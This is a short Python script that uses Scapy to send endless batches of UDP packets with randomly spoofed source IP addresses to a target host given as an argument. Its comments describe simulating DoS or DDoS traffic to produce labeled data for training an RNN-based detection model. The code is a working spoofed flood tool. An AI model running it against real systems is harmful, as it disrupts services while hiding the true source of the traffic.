import sys
import time
from os import popen
from scapy.all import send, sendp, IP, UDP, Ether, TCP
from random import randrange
from time import sleep
import time
import logging
logging.basicConfig(level=logging.INFO)

# Run on a subset of the hosts to simulate either a DOS or a DDOS
# This script assumes that the DOS will be continuous and the source IP will be consistently spoofed
# One required argument is the target of the DOS
# Subnet size and number of other hosts must be pre-configured. Assumption is that hosts will be created in sequential order
# The packet will have a payload identifying it as a DOS packet. This is used exclusively for labeling for training the RNN model.

BATCH = 5
SLEEP = 1

while True:
    sourceip = ".".join([str(randrange(1,256)), str(randrange(1,256)), str(randrange(1,256)), str(randrange(1,256))])
    destinationIP = sys.argv[1]
    packets = [Ether() / IP(dst = sys.argv[1], src = sourceip) / UDP(dport = 1, sport = 80) / "DOS" for i in range(BATCH)]
    sendp(packets)
    sleep(SLEEP)
